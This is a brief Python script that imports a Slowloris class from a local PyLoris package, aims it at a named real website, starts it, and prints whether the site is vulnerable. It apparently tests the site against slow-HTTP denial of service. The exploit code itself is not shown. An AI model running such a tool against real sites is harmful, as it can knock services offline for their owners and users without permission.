from src.PyLoris.slowloris import SlowLoris

test = SlowLoris("https://thecyberdesk.com", 2)


test.start()


print(test.vulnerable)